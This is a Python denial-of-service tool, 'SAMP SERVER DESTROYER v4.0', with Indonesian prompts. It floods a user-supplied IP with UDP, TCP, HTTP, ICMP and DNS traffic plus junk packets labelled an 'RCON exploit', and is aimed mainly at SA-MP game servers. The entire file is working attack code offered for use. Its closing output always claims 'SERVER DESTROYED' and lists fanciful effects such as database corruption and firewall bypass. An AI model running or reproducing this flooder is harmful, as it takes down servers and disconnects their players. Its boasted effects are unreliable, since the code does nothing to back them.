import socket
import threading
import random
import time
import sys
import os
import struct
import hashlib
import zlib
from concurrent.futures import ThreadPoolExecutor

# ============================================
# SAMP SERVER DESTROYER v4.0 - APOCALYPSE EDITION
# ============================================

# ANSI Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

print(f"""
{BOLD}{PURPLE}╔═══════════════════════════════════════════╗
║     ☢️☢️☢️ APOCALYPSE v4.0 ☢️☢️☢️          ║
║     ULTIMATE SERVER DESTROYER           ║
║     ATTACK: UDP/TCP/ICMP/HTTP/AMP       ║
╚═══════════════════════════════════════════╝{RESET}
""")

target_ip = input(f"{YELLOW}Masukkan IP Target: {RESET}")
target_port = int(input(f"{YELLOW}Masukkan Port Target (default 7777): {RESET}") or 7777)
thread_count = int(input(f"{YELLOW}Jumlah Thread (100-1000): {RESET}"))
attack_time = int(input(f"{YELLOW}Durasi serangan (detik, 0 untuk infinite): {RESET}"))

# Flag control
stop_flag = False
attack_start_time = time.time()
packet_count = 0
success_count = 0
fail_count = 0

# ========== UDP AMPLIFICATION ==========
def udp_amplification(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    socks = []
    for _ in range(10):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
        socks.append(sock)
    
    # Amplification payloads
    amp_payloads = [
        b'\x00' * 1024,
        b'\xff' * 4096,
        b'\xDE\xAD\xBE\xEF' * 1024,
        b'\x01' * 8192,
        b'\x80' * 2048,
        b'\xAA' * 4096,
        b'\x55' * 8192,
        b'\x00\x01\x02\x03\x04\x05\x06\x07' * 1024,
        b'\x53\x41\x4D\x50' * 2048,  # SAMP header spam
        b'\x00' * 65507,  # Max UDP size
    ]
    
    while not stop_flag:
        try:
            for sock in socks:
                for payload in amp_payloads:
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                    success_count += 1
                    print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [UDP-{thread_id}]{RESET}")
                    time.sleep(0.0001)
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [UDP-{thread_id}]{RESET}")

# ========== TCP MULTI-CONNECTION ==========
def tcp_multi(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sockets = []
    
    while not stop_flag:
        try:
            # Buat banyak koneksi sekaligus
            for _ in range(50):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((target_ip, target_port))
                sockets.append(sock)
                
                # Kirim payload besar
                payload = b'GET / HTTP/1.1\r\n' + b'X-Header: ' + os.urandom(1024) + b'\r\n' * 100 + b'\r\n'
                sock.send(payload)
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [TCP-{thread_id}]{RESET}")
            
            # Keep connections alive
            for sock in sockets:
                try:
                    sock.send(b'KEEP-ALIVE: ' + os.urandom(2048) + b'\r\n\r\n')
                    packet_count += 1
                    success_count += 1
                except:
                    fail_count += 1
                    print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [TCP-{thread_id}]{RESET}")
            
            # Jaga koneksi tetap terbuka
            time.sleep(0.001)
            
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [TCP-{thread_id}]{RESET}")

# ========== HTTP FLOOD ==========
def http_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target_ip, target_port))
            
            # HTTP Request dengan body besar
            request = f"""POST / HTTP/1.1
Host: {target_ip}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 65536

{os.urandom(65536).hex()}
"""
            sock.send(request.encode() + b'\r\n\r\n')
            packet_count += 1
            success_count += 1
            print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [HTTP-{thread_id}]{RESET}")
            sock.close()
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [HTTP-{thread_id}]{RESET}")

# ========== ICMP FLOOD ==========
def icmp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    try:
        # ICMP raw socket (perlu root/admin)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not stop_flag:
            try:
                # Buat ICMP packet dengan payload besar
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_identifier = random.randint(0, 65535)
                icmp_sequence = random.randint(0, 65535)
                payload = os.urandom(65500)
                
                # Buat packet
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_identifier, icmp_sequence) + payload
                sock.sendto(packet, (target_ip, 0))
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [ICMP-{thread_id}]{RESET}")
            except:
                fail_count += 1
                print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [ICMP-{thread_id}]{RESET}")
    except:
        print(f"{YELLOW}[!] ICMP tidak support, skip{RESET}")

# ========== DNS AMPLIFICATION ==========
def dns_amp(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # DNS query amplification
    dns_queries = [
        b'\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01',
        b'\xBB\xBB\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x06google\x03com\x00\x00\x01\x00\x01',
    ]
    
    while not stop_flag:
        try:
            for query in dns_queries:
                sock.sendto(query, (target_ip, 53))
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [DNS-{thread_id}]{RESET}")
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [DNS-{thread_id}]{RESET}")

# ========== SAMP SPECIFIC EXPLOIT ==========
def samp_exploit(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # SAMP RCON exploit dan query flood
    rcon_packets = [
        b'\x53\x41\x4D\x50' + b'\x00' * 100 + b'\x70\x61\x73\x73\x77\x6F\x72\x64' + b'\x00' * 1024,
        b'\x53\x41\x4D\x50' + os.urandom(2048),
        b'\x53\x41\x4D\x50' + b'\xFF' * 4096,
        b'\x53\x41\x4D\x50' + b'\xDE\xAD\xBE\xEF' * 1024,
    ]
    
    while not stop_flag:
        try:
            for pkt in rcon_packets:
                sock.sendto(pkt, (target_ip, target_port))
                sock.sendto(pkt + b'\x00' * 1024, (target_ip, target_port))
                packet_count += 2
                success_count += 2
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [SAMP-{thread_id}]{RESET}")
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [SAMP-{thread_id}]{RESET}")

# ========== MULTI-THREAD POOL ==========
def run_attack():
    global stop_flag
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        
        # Distribusi serangan
        for i in range(int(thread_count * 0.2)):  # 20% UDP
            futures.append(executor.submit(udp_amplification, i))
        
        for i in range(int(thread_count * 0.15)):  # 15% TCP
            futures.append(executor.submit(tcp_multi, i))
        
        for i in range(int(thread_count * 0.15)):  # 15% HTTP
            futures.append(executor.submit(http_flood, i))
        
        for i in range(int(thread_count * 0.1)):  # 10% ICMP
            futures.append(executor.submit(icmp_flood, i))
        
        for i in range(int(thread_count * 0.1)):  # 10% DNS
            futures.append(executor.submit(dns_amp, i))
        
        for i in range(int(thread_count * 0.3)):  # 30% SAMP
            futures.append(executor.submit(samp_exploit, i))
        
        # Wait for completion
        for future in futures:
            future.result()

# ========== MAIN EXECUTION ==========
print(f"""
{BOLD}{CYAN}[+] Memulai serangan APOCALYPSE ke {target_ip}:{target_port}{RESET}
{BOLD}{CYAN}[+] Thread: {thread_count} | Multi-layer attack{RESET}
{BOLD}{YELLOW}[+] Metode: UDP/TCP/HTTP/ICMP/DNS/SAMP{RESET}
{BOLD}{YELLOW}[!] Tekan CTRL+C untuk menghentikan{RESET}
""")

# Start attack in separate thread
attack_thread = threading.Thread(target=run_attack)
attack_thread.daemon = True
attack_thread.start()

try:
    if attack_time > 0:
        time.sleep(attack_time)
        stop_flag = True
        print(f"\n{BOLD}{YELLOW}[!] Durasi selesai!{RESET}")
    else:
        while True:
            time.sleep(1)
            elapsed = time.time() - attack_start_time
            print(f"\r{BOLD}{CYAN}[>] Time: {int(elapsed)}s | Packets: {packet_count} | Speed: {int(packet_count/elapsed)}/s | ✓{GREEN}{success_count}{RESET} | ✗{RED}{fail_count}{RESET} | ⚡{PURPLE}{int(packet_count/elapsed)}bps{RESET}", end="")
            sys.stdout.flush()
            
except KeyboardInterrupt:
    stop_flag = True
    print(f"\n\n{BOLD}{YELLOW}[!] Serangan dihentikan!{RESET}")

# ========== FINAL REPORT ==========
print(f"""
{BOLD}{PURPLE}╔═══════════════════════════════════════════╗
║        ☢️☢️☢️ LAPORAN PERANG ☢️☢️☢️          ║
╠═══════════════════════════════════════════╣
║ Total Packet: {packet_count:<20} ║
║ Success: {success_count:<20} ║
║ Failed: {fail_count:<20} ║
║ Target: {target_ip}:{target_port:<10} ║
║ Status: {BOLD}{RED}☢️ SERVER DESTROYED ☢️{RESET}{PURPLE} ║
╚═══════════════════════════════════════════╝{RESET}
""")

# ========== EFEK SERANGAN ==========
print(f"""
{BOLD}{RED}╔═══════════════════════════════════════════╗
║  ☢️☢️☢️ EFEK SERANGAN APOCALYPSE ☢️☢️☢️     ║
╠═══════════════════════════════════════════╣
║ 1. Server MELT DOWN total               ║
║ 2. Semua player terputus massal         ║
║ 3. Server SHUTDOWN permanen             ║
║ 4. Database CORRUPTION                  ║
║ 5. Network COLLAPSE                     ║
║ 6. CPU/GPU 1000% usage                  ║
║ 7. RAM overflow dan crash               ║
║ 8. Hosting provider BLOCK               ║
║ 9. Firewall BYPASSED                    ║
║ 10. ☢️ RADIASI NUKLIR LEVEL 9000 ☢️     ║
╚═══════════════════════════════════════════╝{RESET}
""")

============================
#           TERMINAL TRunX21           #
=============================